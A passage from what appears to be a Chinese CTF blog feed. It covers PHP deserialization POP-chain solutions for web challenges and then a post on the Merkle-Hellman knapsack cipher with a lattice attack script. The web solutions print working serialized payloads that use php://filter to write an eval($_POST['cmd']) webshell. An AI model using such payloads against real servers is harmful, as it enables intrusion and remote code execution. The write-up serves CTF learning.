class="variable">$content</span> .= <span class="variable language_">$this</span>-&gt;txt; </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;file, <span class="variable">$content</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$content</span>); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))&#123; </span><br><span class="line">    <span class="variable">$hzy</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;giao&#x27;</span>]); </span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hzy</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">catf1ag1</span>(); </span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>(); </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// $content长度正好，不用补，内容为</span></span><br><span class="line"><span class="comment">/*&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;*/</span></span><br><span class="line"><span class="variable">$text</span>=<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">catf1ag2</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;file=<span class="string">&quot;php://filter/convert.base64-decode/resource=xxxx.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;txt=<span class="variable">$text</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">catf1ag1</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;hzy=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;arr=<span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>=&gt;<span class="string">&#x27;pputut&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>2.运行上述代码得到结果，post giao参数为：</p><p><code>Tzo4OiJjYXRmMWFnMSI6Mjp7czozOiJoenkiO086ODoiY2F0ZjFhZzIiOjI6e3M6NDoiZmlsZSI7czo1MjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT14eHh4LnBocCI7czozOiJ0eHQiO3M6NDA6IlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTnRaQ2RkS1RzL1BnPT0iO31zOjM6ImFyciI7YToxOntpOjE7czo2OiJwcHV0dXQiO319</code></p><p>即用php://filter绕过这个“死亡die”,传入小马</p><p>3.连接小马根目录读取flag(没环境无法复现)</p></li><li><p>题目十：ezlogin</p><p>1.扫描网站得到robots.txt,访问发现imdex.php</p><p>2.访问imdex.php，查看源码存在向way传入source.php的提示</p><p>3.试着解码way原来的带的参数为:base64decode两次后ascii解码--&gt;imdex.php</p><p>4.用3反向操作得到source.php编码后结果：TnpNMlpqYzFOekkyTXpZMU1tVTNNRFk0TnpBPQ==，传入way，得到source源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hello</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hello = <span class="keyword">new</span> C;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hello))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hello-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Are you ok? Small dog&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">world</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;886&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="variable language_">$this</span>-&gt;text;</span><br><span class="line">         <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">world</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello,world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$IO</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;where is your chain?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.与上一题POP类似，构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hello</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hello = <span class="keyword">new</span> C;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_hello</span>(<span class="params"><span class="variable">$h</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hello = <span class="variable">$h</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hello))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hello-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Are you ok? Small dog&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">world</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;886&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="variable language_">$this</span>-&gt;text;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">world</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello,world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$IO</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;where is your chain?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加aaa补齐$test</span></span><br><span class="line"><span class="comment">//小马cmd连</span></span><br><span class="line"><span class="variable">$text</span>=<span class="string">&#x27;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;</span>;</span><br><span class="line"><span class="variable">$final</span>=<span class="variable">$test</span>.<span class="variable">$text</span>;</span><br><span class="line"><span class="comment">// file_put_contents(&quot;test.php&quot;,$final);</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="variable">$final</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>],<span class="variable">$text</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">set_hello</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>6.访问http://127.0.0.1/tqxa/source1.php?filename=php://filter/convert.base64-decode/resource=xxxx.php 页面传入filename得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:5:&quot;hello&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-decode/resource=xxxx.php&quot;;s:4:&quot;text&quot;;s:43:&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实可以不传参，直接写php://filter</p><p>7.将上述序列化字符串传入网页，写入xxxx.php,小马连接，在根目录得到flag（没环境无法复现）</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;天权信安ampcatf1ag&quot;&gt;天权信安&amp;amp;catf1ag&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&quot;一-解题情况&quot;&gt;一、解题情况&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;排名：17&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;二-解题过程&quot;&gt;二、</summary>
      
    
    
    
    <category term="match" scheme="https://feverhu.github.io/categories/match/"/>
    
    
  </entry>
  
  <entry>
    <title>背包密码算法</title>
    <link href="https://feverhu.github.io/2022/12/07/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    <id>https://feverhu.github.io/2022/12/07/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/</id>
    <published>2022-12-07T04:37:04.000Z</published>
    <updated>2022-12-07T05:18:36.923Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="背包密码算法">背包密码算法</span></h1><p>以下转自<a href="https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">拉师傅博客</a>：</p><h3><span id="merkle-hellman背包加密knapsack">Merkle-Hellman背包加密（Knapsack）</span></h3><p>1977年，Merkle与Hellman合作设计了使用背包算法，该算法提出后密码学界提出了很多背包型加密算法。</p><p>其工作原理是：假定甲想加密，则先产生一个较易求解的背包问题，并用它的解作为专用密钥；然后从这个问题出发，生成另一个难解的背包问题，并作为公共密钥。如果乙想向甲发送报文，乙就可以使用难解的背包问题对报文进行加密，由于这个问题十分难解，所以一般没有人能够破译密文；甲收到密文后，可以使用易解的专用密钥解密。</p><p>但是，在它发表几年后，就找到了攻破它的方法。即使如此，它仍然代表着一类很难问题的算法。</p><ul><li><p><strong>加密</strong></p><p>选择任何一个<strong>超递增集</strong> {s1,s2,…,sn}。</p><p>陷门由任意大于 ∑isi 的素数 p 和任意小于 p 的整数 p 组成，这两个数和集合 {s1,s2,…,sn} 都是保密的。</p><p>公开的整数集是 {t1,t2,…,tn} ，其中 ti=ai⋅si(modp)。</p><p>二进制明文 (b1,b2,…,bn) 的加密操作为 y=∑ibiti，整数 y 是密文。</p></li><li><p><strong>解密</strong></p><p>找到 a−1(modp)。因为 p 是质数， a−1(modp) 一定存在。计算 a−1y(modp)。</p><p>得到 a−1y(modp) 这使得：</p><p>a−1y=a−1∑ibiti(modp)=∑ibi(a−1asi)(modp)=∑ibisi</p><p>因为集合 {s1,s2,…,sn}是超递增集，所以很容易定位明文位。</p></li></ul><p><strong>★注：</strong></p><p>Knapsack系统的<strong><a href="https://eprint.iacr.org/2007/066.pdf">密度</a></strong>为：</p><p>d=nlog2⁡(max{ai})</p><p>基于子集和问题，<strong>MH密码系统</strong>是最开始出现的一种密度比较低的Knapsack密码系统。很快Shamir等人提出了一系列的攻击方式，包括丢番图逼近，LLL等方法（d&lt;0.9408）。虽然这个密码系统被攻破了，新的Knapsack系统诞生了，这种密码系统的密度变高了，ai 值变小了，而且加密的明文的二进制位中<code>1</code>的数量也很小。</p><p>新的密码系统更加难以破解，也称之为<strong>HardKnapsack</strong>系统，不过后来密码学家们还是发现了攻击方法，我们称之为low-weight attack。</p><ul><li><p><strong>Schroeppel-Shamir Algorithm</strong></p><p>时间复杂度,空间复杂度均为 O(n2)</p></li><li><p><strong>The Howgrave-Graham–Joux Algorithm</strong></p><p>时间复杂度 O(0.337n)，空间复杂度 O(0.256n)</p></li></ul><p>总体来说，这两种算法是基于分治和mitm的思想进行攻击的。</p><ul><li><p><strong>Lagarias and Odlyzko’s Method / CJLOSS Method</strong></p><p>参考：<a href="https://www.ieice.org/publications/conference-FIT-DVDs/FIT2018/data/pdf/A-022.pdf">Lattice Reduction Attack on the Knapsack Type Cryptosystem</a></p><p>构造格：</p><p><img src="1670388219375.png" alt="1670388219375"></p></li></ul><h3><span id="脚本">脚本</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line"></span><br><span class="line">pk =  # public key</span><br><span class="line">ct =  # ciphertext</span><br><span class="line">print(ct)</span><br><span class="line">print(len(pk))</span><br><span class="line">n = len(pk)</span><br><span class="line"></span><br><span class="line"># Sanity check for application of low density attack</span><br><span class="line">d = n / log(max(pk), 2)</span><br><span class="line">print(CDF(d))</span><br><span class="line">assert CDF(d) &lt; 0.9408</span><br><span class="line"></span><br><span class="line">M = Matrix.identity(n) * 2</span><br><span class="line"></span><br><span class="line">last_row = [1 for x in pk]</span><br><span class="line">M_last_row = Matrix(ZZ, 1, len(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col = pk</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, len(last_col), 1, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.BKZ()</span><br><span class="line"></span><br><span class="line">sol = []</span><br><span class="line">for i in range(n + 1):</span><br><span class="line">    testrow = X.row(i).list()[:-1]</span><br><span class="line">    if set(testrow).issubset([-1, 1]):</span><br><span class="line">        for v in testrow:</span><br><span class="line">            if v == 1:</span><br><span class="line">                sol.append(0)</span><br><span class="line">            elif v == -1:</span><br><span class="line">                sol.append(1)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">s = sol</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* 复制并使用代码请注明引用出处哦~</span><br><span class="line">* Lazzaro @ https://lazzzaro.github.io</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3><span id="例题">例题：</span></h3><h4><span id="dest0g3-520迎新赛-bag">Dest0g3 520迎新赛 Bag</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">message = bytes_to_long(flag[<span class="number">8</span>:-<span class="number">1</span>])</span><br><span class="line">Baglenth=<span class="number">286</span></span><br><span class="line">Bag=[<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">48</span>, <span class="number">96</span>, <span class="number">192</span>, <span class="number">384</span>, <span class="number">768</span>, <span class="number">1536</span>, <span class="number">3072</span>, <span class="number">6144</span>, <span class="number">12288</span>, <span class="number">24576</span>, <span class="number">49152</span>, <span class="number">98304</span>, <span class="number">196608</span>, <span class="number">393216</span>, <span class="number">786432</span>, <span class="number">1572864</span>, <span class="number">3145728</span>, <span class="number">6291456</span>, <span class="number">12582912</span>, <span class="number">25165824</span>, <span class="number">50331648</span>, <span class="number">100663296</span>, <span class="number">201326592</span>, <span class="number">402653184</span>, <span class="number">805306368</span>, <span class="number">1610612736</span>, <span class="number">3221225472</span>, <span class="number">6442450944</span>, <span class="number">12884901888</span>, <span class="number">25769803776</span>, <span class="number">51539607552</span>, <span class="number">103079215104</span>, <span class="number">206158430208</span>, <span class="number">412316860416</span>, <span class="number">824633720832</span>, <span class="number">1649267441664</span>, <span class="number">3298534883328</span>, <span class="number">6597069766656</span>, <span class="number">13194139533312</span>, <span class="number">26388279066624</span>, <span class="number">52776558133248</span>, <span class="number">105553116266496</span>, <span class="number">211106232532992</span>, <span class="number">422212465065984</span>, <span class="number">844424930131968</span>, <span class="number">1688849860263936</span>, <span class="number">3377699720527872</span>, <span class="number">6755399441055744</span>, <span class="number">13510798882111488</span>, <span class="number">27021597764222976</span>, <span class="number">54043195528445952</span>, <span class="number">108086391056891904</span>, <span class="number">216172782113783808</span>, <span class="number">432345564227567616</span>, <span class="number">864691128455135232</span>, <span class="number">1729382256910270464</span>, <span class="number">3458764513820540928</span>, <span class="number">6917529027641081856</span>, <span class="number">13835058055282163712</span>, <span class="number">27670116110564327424</span>, <span class="number">55340232221128654848</span>, <span class="number">110680464442257309696</span>, <span class="number">221360928884514619392</span>, <span class="number">442721857769029238784</span>, <span class="number">885443715538058477568</span>, <span class="number">1770887431076116955136</span>, <span class="number">3541774862152233910272</span>, <span class="number">7083549724304467820544</span>, <span class="number">14167099448608935641088</span>, <span class="number">28334198897217871282176</span>, <span class="number">56668397794435742564352</span>, <span class="number">113336795588871485128704</span>, <span class="number">226673591177742970257408</span>, <span class="number">453347182355485940514816</span>, <span class="number">906694364710971881029632</span>, <span class="number">1813388729421943762059264</span>, <span class="number">3626777458843887524118528</span>, <span class="number">7253554917687775048237056</span>, <span class="number">14507109835375550096474112</span>, <span class="number">29014219670751100192948224</span>, <span class="number">58028439341502200385896448</span>, <span class="number">116056878683004400771792896</span>, <span class="number">232113757366008801543585792</span>, <span class="number">464227514732017603087171584</span>, <span class="number">928455029464035206174343168</span>, <span class="number">1856910058928070412348686336</span>, <span class="number">3713820117856140824697372672</span>, <span class="number">7427640235712281649394745344</span>, <span class="number">14855280471424563298789490688</span>, <span class="number">29710560942849126597578981376</span>, <span class="number">59421121885698253195157962752</span>, <span class="number">118842243771396506390315925504</span>, <span class="number">237684487542793012780631851008</span>, <span class="number">475368975085586025561263702016</span>, <span class="number">950737950171172051122527404032</span>, <span class="number">1901475900342344102245054808064</span>, <span class="number">3802951800684688204490109616128</span>, <span class="number">7605903601369376408980219232256</span>, <span class="number">15211807202738752817960438464512</span>, <span class="number">30423614405477505635920876929024</span>, <span class="number">60847228810955011271841753858048</span>, <span class="number">121694457621910022543683507716096</span>, <span class="number">243388915243820045087367015432192</span>, <span class="number">486777830487640090174734030864384</span>, <span class="number">973555660975280180349468061728768</span>, <span class="number">1947111321950560360698936123457536</span>, <span class="number">3894222643901120721397872246915072</span>, <span class="number">7788445287802241442795744493830144</span>, <span class="number">15576890575604482885591488987660288</span>, <span class="number">31153781151208965771182977975320576</span>, <span class="number">62307562302417931542365955950641152</span>, <span class="number">124615124604835863084731911901282304</span>, <span class="number">249230249209671726169463823802564608</span>, <span class="number">498460498419343452338927647605129216</span>, <span class="number">996920996838686904677855295210258432</span>, <span class="number">1993841993677373809355710590420516864</span>, <span class="number">3987683987354747618711421180841033728</span>, <span class="number">7975367974709495237422842361682067456</span>, <span class="number">15950735949418990474845684723364134912</span>, <span class="number">31901471898837980949691369446728269824</span>, <span class="number">63802943797675961899382738893456539648</span>, <span class="number">127605887595351923798765477786913079296</span>, <span class="number">255211775190703847597530955573826158592</span>, <span class="number">510423550381407695195061911147652317184</span>, <span class="number">1020847100762815390390123822295304634368</span>, <span class="number">2041694201525630780780247644590609268736</span>, <span class="number">4083388403051261561560495289181218537472</span>, <span class="number">8166776806102523123120990578362437074944</span>, <span class="number">16333553612205046246241981156724874149888</span>, <span class="number">32667107224410092492483962313449748299776</span>, <span class="number">65334214448820184984967924626899496599552</span>, <span class="number">130668428897640369969935849253798993199104</span>, <span class="number">261336857795280739939871698507597986398208</span>, <span class="number">522673715590561479879743397015195972796416</span>, <span class="number">1045347431181122959759486794030391945592832</span>, <span class="number">2090694862362245919518973588060783891185664</span>, <span class="number">4181389724724491839037947176121567782371328</span>, <span class="number">8362779449448983678075894352243135564742656</span>, <span class="number">16725558898897967356151788704486271129485312</span>, <span class="number">33451117797795934712303577408972542258970624</span>, <span 